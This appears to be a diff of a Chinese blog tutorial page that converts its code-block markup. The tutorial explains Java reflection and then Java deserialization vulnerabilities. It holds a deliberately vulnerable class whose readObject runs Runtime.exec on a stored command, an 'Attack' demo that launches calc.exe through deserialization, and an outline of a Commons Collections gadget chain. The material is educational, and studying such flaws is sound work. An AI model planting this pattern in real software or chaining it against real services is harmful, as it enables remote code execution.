@@ -456,14 +456,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.1k
+                    5.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    21 分
+                    22 分
                 </div>
                 
 
@@ -477,6 +477,9 @@
         </div>
         <hr class="clearfix">
 
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -516,9 +519,39 @@
 <p><strong>为啥叫“反射”？</strong><br>可以把一个类当成镜子，反射就是让你在运行时“照镜子”——看清自己（类）长啥样，还能动手动脚（改它）。</p>
 </blockquote>
 <h4 id="2-反射能做什么？"><a href="#2-反射能做什么？" class="headerlink" title="2. 反射能做什么？"></a>2. <strong>反射能做什么？</strong></h4><p>通过反射，<strong>运行时</strong>动态操作类信息，无需在编译时确定具体类。以下代码演示核心功能：</p>
-<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-comment">// 1. 动态加载类（类名可来自配置文件/网络）</span><br>Class&lt;?&gt; clazz = Class.<span class="hljs-property">forName</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>);<br><br><span class="hljs-comment">// 2. 创建对象（无需new关键字）</span><br><span class="hljs-built_in">Object</span> <span class="hljs-built_in">str</span> = clazz.<span class="hljs-property">getDeclaredConstructor</span>().<span class="hljs-property">newInstance</span>();<br><br><span class="hljs-comment">// 3. 调用方法（方法名可动态传入）</span><br>Method method = clazz.<span class="hljs-property">getMethod</span>(<span class="hljs-string">&quot;substring&quot;</span>, <span class="hljs-type">int</span>.<span class="hljs-property">class</span>);<br><span class="hljs-built_in">String</span> result = (<span class="hljs-built_in">String</span>) method.<span class="hljs-property">invoke</span>(<span class="hljs-built_in">str</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">// 调用str.substring(2)</span><br><br><span class="hljs-comment">// 4. 访问私有字段（突破封装性）</span><br>Field field = clazz.<span class="hljs-property">getDeclaredField</span>(<span class="hljs-string">&quot;value&quot;</span>); <span class="hljs-comment">// String内部存储字符的数组</span><br>field.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 暴力反射！</span><br><span class="hljs-type">byte</span>[] value = (<span class="hljs-type">byte</span>[]) field.<span class="hljs-property">get</span>(<span class="hljs-built_in">str</span>);<br>System.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(Arrays.<span class="hljs-property">toString</span>(value)); <span class="hljs-comment">// 输出字符数组</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 1. 动态加载类（类名可来自配置文件&#x2F;网络）
+Class&lt;?&gt; clazz &#x3D; Class.forName(&quot;java.lang.String&quot;);
+
+&#x2F;&#x2F; 2. 创建对象（无需new关键字）
+Object str &#x3D; clazz.getDeclaredConstructor().newInstance();
+
+&#x2F;&#x2F; 3. 调用方法（方法名可动态传入）
+Method method &#x3D; clazz.getMethod(&quot;substring&quot;, int.class);
+String result &#x3D; (String) method.invoke(str, 2); &#x2F;&#x2F; 调用str.substring(2)
+
+&#x2F;&#x2F; 4. 访问私有字段（突破封装性）
+Field field &#x3D; clazz.getDeclaredField(&quot;value&quot;); &#x2F;&#x2F; String内部存储字符的数组
+field.setAccessible(true); &#x2F;&#x2F; 暴力反射！
+byte[] value &#x3D; (byte[]) field.get(str);
+System.out.println(Arrays.toString(value)); &#x2F;&#x2F; 输出字符数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>以<strong>Spring IOC</strong>为例，它大概这么玩反射：</p>
-<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanFactory</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; beanMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">registerBean</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> beanName, <span class="hljs-title class_">String</span> className</span>) &#123;<br>        <span class="hljs-comment">// 1. 反射加载类</span><br>        <span class="hljs-title class_">Class</span>&lt;?&gt; clazz = <span class="hljs-title class_">Class</span>.<span class="hljs-title function_">forName</span>(className);<br>        <span class="hljs-comment">// 2. 反射创建对象（通常调无参构造）</span><br>        <span class="hljs-title class_">Object</span> bean = clazz.<span class="hljs-title function_">getDeclaredConstructor</span>().<span class="hljs-title function_">newInstance</span>();<br>        <span class="hljs-comment">// 3. 塞进容器（下次getBean直接拿）</span><br>        beanMap.<span class="hljs-title function_">put</span>(beanName, bean);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getBean</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> beanName</span>) &#123;<br>        <span class="hljs-keyword">return</span> beanMap.<span class="hljs-title function_">get</span>(beanName);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">
+public class BeanFactory &#123;
+    private Map&lt;String, Object&gt; beanMap &#x3D; new HashMap&lt;&gt;();
+    
+    public void registerBean(String beanName, String className) &#123;
+        &#x2F;&#x2F; 1. 反射加载类
+        Class&lt;?&gt; clazz &#x3D; Class.forName(className);
+        &#x2F;&#x2F; 2. 反射创建对象（通常调无参构造）
+        Object bean &#x3D; clazz.getDeclaredConstructor().newInstance();
+        &#x2F;&#x2F; 3. 塞进容器（下次getBean直接拿）
+        beanMap.put(beanName, bean);
+    &#125;
+    
+    public Object getBean(String beanName) &#123;
+        return beanMap.get(beanName);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>实际Spring还做了<strong>依赖注入</strong>（用反射<code>set</code>字段）、<strong>AOP代理</strong>（反射调方法）—— 所以说没反射就没Spring！</p>
@@ -544,7 +577,9 @@
 <li><p><strong>每个类在JVM中只有一个<code>Class</code>对象</strong>，存储类元信息（方法、字段等）。</p>
 </li>
 <li><p>获取<code>Class</code>对象的三种方式：</p>
-  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Class</span>&lt;?&gt; c1 = String.<span class="hljs-keyword">class</span>;          <span class="hljs-comment">// 类字面量</span><br><span class="hljs-keyword">Class</span>&lt;?&gt; c2 = <span class="hljs-string">&quot;abc&quot;</span>.getClass();      <span class="hljs-comment">// 对象实例</span><br><span class="hljs-keyword">Class</span>&lt;?&gt; c3 = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.String&quot;</span>); <span class="hljs-comment">// 最常用（动态加载）</span><br></code></pre></td></tr></table></figure>
+  <pre class="line-numbers language-none"><code class="language-none">Class&lt;?&gt; c1 &#x3D; String.class;          &#x2F;&#x2F; 类字面量
+Class&lt;?&gt; c2 &#x3D; &quot;abc&quot;.getClass();      &#x2F;&#x2F; 对象实例
+Class&lt;?&gt; c3 &#x3D; Class.forName(&quot;java.lang.String&quot;); &#x2F;&#x2F; 最常用（动态加载）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <strong>为什么用<code>Class.forName</code>？</strong><br>  支持从配置文件&#x2F;数据库读取类名，实现<strong>动态扩展</strong>（如Spring的Bean加载）。</p>
 </li>
 </ul>
@@ -577,21 +612,42 @@
 </tr>
 </tbody></table>
 <h4 id="不用new也能创建对象"><a href="#不用new也能创建对象" class="headerlink" title="** 不用new也能创建对象**"></a>** 不用new也能创建对象**</h4><p>拿到<code>Class</code>后，就能创建对象了！尤其适合<strong>不知道具体类</strong>的场景（比如Spring创建Bean）：</p>
-<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">// 1：调无参构造（最常用）</span><br>Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;com.example.User&quot;</span>);<br><span class="hljs-built_in">Object</span> user = clazz.getDeclaredConstructor().newInstance(); <span class="hljs-comment">// 相当于 new User()</span><br><br><span class="hljs-comment">// 2：调有参构造（带参数的那种）</span><br>Constructor&lt;?&gt; constructor = clazz.getConstructor(<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>); <span class="hljs-comment">// 参数类型列表</span><br><span class="hljs-built_in">Object</span> user2 = constructor.newInstance(<span class="hljs-string">&quot;张三&quot;</span>, <span class="hljs-number">25</span>); <span class="hljs-comment">// 传入实参</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 1：调无参构造（最常用）
+Class&lt;?&gt; clazz &#x3D; Class.forName(&quot;com.example.User&quot;);
+Object user &#x3D; clazz.getDeclaredConstructor().newInstance(); &#x2F;&#x2F; 相当于 new User()
+
+&#x2F;&#x2F; 2：调有参构造（带参数的那种）
+Constructor&lt;?&gt; constructor &#x3D; clazz.getConstructor(String.class, int.class); &#x2F;&#x2F; 参数类型列表
+Object user2 &#x3D; constructor.newInstance(&quot;张三&quot;, 25); &#x2F;&#x2F; 传入实参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p> <strong>坑</strong>：<code>clazz.newInstance()</code>已过时！用<code>getDeclaredConstructor().newInstance()</code>代替。</p>
 </blockquote>
 <hr>
 <h4 id="方法"><a href="#方法" class="headerlink" title="** 方法**"></a>** 方法**</h4><p>动态调方法才是反射的好玩操作！比如根据用户输入调用不同API：</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 步骤1：拿到Method对象（方法名+参数类型）</span><br>Method method = clazz.<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>); <span class="hljs-comment">// 方法名&quot;setName&quot;，参数String</span><br><br><span class="hljs-comment">// 步骤2：对着对象“按按钮”（invoke）</span><br>method.<span class="hljs-built_in">invoke</span>(user, <span class="hljs-string">&quot;张三&quot;</span>); <span class="hljs-comment">// 相当于 user.setName(&quot;张三&quot;)</span><br><br><span class="hljs-comment">// 甚至...调用私有方法！（危险动作）</span><br>Method secretMethod = clazz.<span class="hljs-built_in">getDeclaredMethod</span>(<span class="hljs-string">&quot;privateMethod&quot;</span>);<br>secretMethod.<span class="hljs-built_in">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 暴力突破private限制！</span><br>secretMethod.<span class="hljs-built_in">invoke</span>(user);<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 步骤1：拿到Method对象（方法名+参数类型）
+Method method &#x3D; clazz.getMethod(&quot;setName&quot;, String.class); &#x2F;&#x2F; 方法名&quot;setName&quot;，参数String
+
+&#x2F;&#x2F; 步骤2：对着对象“按按钮”（invoke）
+method.invoke(user, &quot;张三&quot;); &#x2F;&#x2F; 相当于 user.setName(&quot;张三&quot;)
+
+&#x2F;&#x2F; 甚至...调用私有方法！（危险动作）
+Method secretMethod &#x3D; clazz.getDeclaredMethod(&quot;privateMethod&quot;);
+secretMethod.setAccessible(true); &#x2F;&#x2F; 暴力突破private限制！
+secretMethod.invoke(user);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p> <strong>黑科技</strong>：<code>setAccessible(true)</code>是反射的“破墙锤”——能访问<code>private</code>&#x2F;<code>protected</code>成员（框架里常用，自己代码慎用！）。</p>
 </blockquote>
 <hr>
 <h4 id="改字段——改对象内存"><a href="#改字段——改对象内存" class="headerlink" title="** 改字段——改对象内存**"></a>** 改字段——改对象内存**</h4><p>直接修改对象属性，连setter都不用</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// 偷看字段值</span><br>Field field = clazz.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 无视private</span><br><span class="hljs-built_in">int</span> age = (<span class="hljs-built_in">int</span>) field.<span class="hljs-keyword">get</span>(user); <span class="hljs-comment">// 拿到user.age的值</span><br><br><span class="hljs-comment">// 偷偷改掉！</span><br>field.<span class="hljs-keyword">set</span>(user, <span class="hljs-number">30</span>); <span class="hljs-comment">// 神不知鬼不觉把age改成30</span><br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 偷看字段值
+Field field &#x3D; clazz.getDeclaredField(&quot;age&quot;);
+field.setAccessible(true); &#x2F;&#x2F; 无视private
+int age &#x3D; (int) field.get(user); &#x2F;&#x2F; 拿到user.age的值
+
+&#x2F;&#x2F; 偷偷改掉！
+field.set(user, 30); &#x2F;&#x2F; 神不知鬼不觉把age改成30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p> <strong>实验</strong>：试试用反射改<code>String</code>的内容？—— JVM对<code>String</code>做了优化，别白费劲啦。</p>
@@ -647,24 +703,79 @@
 <li><strong>优先用接口调用</strong>：如<code>obj.method()</code>比<code>method.invoke(obj)</code>快10倍以上。</li>
 </ul>
 <hr>
-<h3 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css">graph <span class="hljs-selector-tag">TD</span><br>    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[反射核心：Class对象]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[创建对象]</span><br>    <span class="hljs-selector-tag">A</span> --&gt; C<span class="hljs-selector-attr">[调用方法]</span><br>    <span class="hljs-selector-tag">A</span> --&gt; D<span class="hljs-selector-attr">[访问字段]</span><br>    <span class="hljs-selector-tag">B</span> --&gt; E<span class="hljs-selector-attr">[Constructor.newInstance()]</span><br>    C --&gt; F<span class="hljs-selector-attr">[Method.invoke()]</span><br>    D --&gt; <span class="hljs-selector-tag">G</span><span class="hljs-selector-attr">[Field.get()/set()]</span><br>    E --&gt; H<span class="hljs-selector-attr">[动态代理/IOC]</span><br>    F --&gt; <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[框架方法拦截]</span><br>    <span class="hljs-selector-tag">G</span> --&gt; J<span class="hljs-selector-attr">[序列化/配置注入]</span><br>    H --&gt; K<span class="hljs-selector-attr">[Spring]</span><br>    <span class="hljs-selector-tag">I</span> --&gt; K<br>    J --&gt; K<br></code></pre></td></tr></table></figure>
+<h3 id="四、总结："><a href="#四、总结：" class="headerlink" title="四、总结："></a>四、总结：</h3><pre class="line-numbers language-none"><code class="language-none">graph TD
+    A[反射核心：Class对象] --&gt; B[创建对象]
+    A --&gt; C[调用方法]
+    A --&gt; D[访问字段]
+    B --&gt; E[Constructor.newInstance()]
+    C --&gt; F[Method.invoke()]
+    D --&gt; G[Field.get()&#x2F;set()]
+    E --&gt; H[动态代理&#x2F;IOC]
+    F --&gt; I[框架方法拦截]
+    G --&gt; J[序列化&#x2F;配置注入]
+    H --&gt; K[Spring]
+    I --&gt; K
+    J --&gt; K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>反射的本质</strong>：<strong>运行时操作类元信息的能力</strong>，是框架灵活性的根基，但需权衡<strong>灵活性</strong>、<strong>安全性</strong>与<strong>性能</strong>。</p>
 <h2 id="java序列化基础"><a href="#java序列化基础" class="headerlink" title="java序列化基础"></a>java序列化基础</h2><h3 id="一、先看一个漏洞触发案例"><a href="#一、先看一个漏洞触发案例" class="headerlink" title="一、先看一个漏洞触发案例"></a><strong>一、先看一个漏洞触发案例</strong></h3><p>完整：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 漏洞类：重写了readObject()</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnerableObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String command;<br>    <span class="hljs-comment">// 构造方法略...</span><br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        in.defaultReadObject(); <span class="hljs-comment">// 默认反序列化</span><br>        Runtime.getRuntime().exec(<span class="hljs-built_in">this</span>.command); <span class="hljs-comment">// 危险操作！</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 攻击者构造恶意数据</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 1. 创建恶意对象（命令注入）</span><br>        <span class="hljs-type">VulnerableObject</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VulnerableObject</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        <br>        <span class="hljs-comment">// 2. 序列化对象 -&gt; 字节流</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>        oos.writeObject(payload);<br>        <span class="hljs-type">byte</span>[] maliciousData = bos.toByteArray();<br>        <br>        <span class="hljs-comment">// 3. 受害者反序列化 -&gt; 触发命令执行</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(maliciousData);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>        ois.readObject(); <span class="hljs-comment">// 此处弹出计算器！</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 漏洞类：重写了readObject()
+public class VulnerableObject implements Serializable &#123;
+    private String command;
+    &#x2F;&#x2F; 构造方法略...
+    
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
+        in.defaultReadObject(); &#x2F;&#x2F; 默认反序列化
+        Runtime.getRuntime().exec(this.command); &#x2F;&#x2F; 危险操作！
+    &#125;
+&#125;
+
+&#x2F;&#x2F; 攻击者构造恶意数据
+public class Attack &#123;
+    public static void main(String[] args) throws Exception &#123;
+        &#x2F;&#x2F; 1. 创建恶意对象（命令注入）
+        VulnerableObject payload &#x3D; new VulnerableObject(&quot;calc.exe&quot;);
+        
+        &#x2F;&#x2F; 2. 序列化对象 -&gt; 字节流
+        ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(bos);
+        oos.writeObject(payload);
+        byte[] maliciousData &#x3D; bos.toByteArray();
+        
+        &#x2F;&#x2F; 3. 受害者反序列化 -&gt; 触发命令执行
+        ByteArrayInputStream bis &#x3D; new ByteArrayInputStream(maliciousData);
+        ObjectInputStream ois &#x3D; new ObjectInputStream(bis);
+        ois.readObject(); &#x2F;&#x2F; 此处弹出计算器！
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>分析</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnerableObject</span> implements Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> command;<br>    <span class="hljs-comment">// 构造方法：设置要执行的命令</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">VulnerableObject</span><span class="hljs-params">(<span class="hljs-type">String</span> command)</span> </span>&#123; <span class="hljs-keyword">this</span>.command = command; &#125;<br><br>    <span class="hljs-comment">// 反序列化时自动触发</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> throws IOException, ClassNotFoundException </span>&#123;<br>        in.<span class="hljs-built_in">defaultReadObject</span>(); <span class="hljs-comment">// 默认反序列化</span><br>        Runtime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(<span class="hljs-keyword">this</span>.command); <span class="hljs-comment">// 炸弹引爆点💣</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">public class VulnerableObject implements Serializable &#123;
+    private String command;
+    &#x2F;&#x2F; 构造方法：设置要执行的命令
+    public VulnerableObject(String command) &#123; this.command &#x3D; command; &#125;
+
+    &#x2F;&#x2F; 反序列化时自动触发
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
+        in.defaultReadObject(); &#x2F;&#x2F; 默认反序列化
+        Runtime.getRuntime().exec(this.command); &#x2F;&#x2F; 炸弹引爆点💣
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>攻击流程</strong>：</p>
 <ol>
 <li><p><strong>构造恶意对象</strong>：<code>VulnerableObject payload = new VulnerableObject(&quot;calc.exe&quot;);</code><br> → 相当于制作一个藏了刀的盒子</p>
 </li>
 <li><p><strong>序列化成字节流</strong>：</p>
- <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ByteArrayOutputStream bos <span class="hljs-operator">=</span> new ByteArrayOutputStream()<span class="hljs-comment">;</span><br>ObjectOutputStream oos <span class="hljs-operator">=</span> new ObjectOutputStream(bos)<span class="hljs-comment">;</span><br>oos.writeObject(payload)<span class="hljs-comment">; // 把刀盒封装成快递</span><br>byte[] maliciousData <span class="hljs-operator">=</span> bos.toByteArray()<span class="hljs-comment">; // 包裹</span><br></code></pre></td></tr></table></figure>
+ <pre class="line-numbers language-none"><code class="language-none">ByteArrayOutputStream bos &#x3D; new ByteArrayOutputStream();
+ObjectOutputStream oos &#x3D; new ObjectOutputStream(bos);
+oos.writeObject(payload); &#x2F;&#x2F; 把刀盒封装成快递
+byte[] maliciousData &#x3D; bos.toByteArray(); &#x2F;&#x2F; 包裹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
 <li><p><strong>触发漏洞</strong>：</p>
- <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ByteArrayInputStream bis <span class="hljs-operator">=</span> new ByteArrayInputStream(maliciousData)<span class="hljs-comment">;</span><br>ObjectInputStream ois <span class="hljs-operator">=</span> new ObjectInputStream(bis)<span class="hljs-comment">;</span><br>ois.readObject()<span class="hljs-comment">; // 拆快递盒 → 刀（弹出计算器）</span><br></code></pre></td></tr></table></figure></li>
+ <pre class="line-numbers language-none"><code class="language-none">ByteArrayInputStream bis &#x3D; new ByteArrayInputStream(maliciousData);
+ObjectInputStream ois &#x3D; new ObjectInputStream(bis);
+ois.readObject(); &#x2F;&#x2F; 拆快递盒 → 刀（弹出计算器）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ol>
 <p><strong>关键点</strong>：</p>
 <ul>
@@ -701,8 +812,15 @@
 </blockquote>
 <hr>
 <h3 id="四、漏洞利用链的解题逻辑"><a href="#四、漏洞利用链的解题逻辑" class="headerlink" title="四、漏洞利用链的解题逻辑"></a><strong>四、漏洞利用链的解题逻辑</strong></h3><p>实际漏洞很少像上面那么简单，而是像<strong>多米诺骨牌</strong>一样串联调用（称为Gadget Chain）。例如：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">readObject</span><span class="hljs-params">()</span></span> → 调用A类方法 → 调用B类方法 →...→ 执行Runtime<span class="hljs-selector-class">.exec</span>()<br></code></pre></td></tr></table></figure>
-<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br><br><span class="hljs-function"><span class="hljs-title">readObject</span>-&gt;</span>&gt;TransformedMap: 遍历Map触发setValue()<br>T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>-&gt;</span>&gt;ChainedTransformer: 调用transform()<br>C<span class="hljs-function"><span class="hljs-title">hainedTransformer</span>-&gt;</span>&gt;InvokerTransformer1: 执行ConstantTransformer<br>I<span class="hljs-function"><span class="hljs-title">nvokerTransformer1</span>-&gt;</span>&gt;InvokerTransformer2: 反射getMethod()<br>I<span class="hljs-function"><span class="hljs-title">nvokerTransformer2</span>-&gt;</span>&gt;InvokerTransformer3: 反射invoke()<br>I<span class="hljs-function"><span class="hljs-title">nvokerTransformer3</span>-&gt;</span>&gt;Runtime.exec(): 弹计算器！<br></code></pre></td></tr></table></figure>
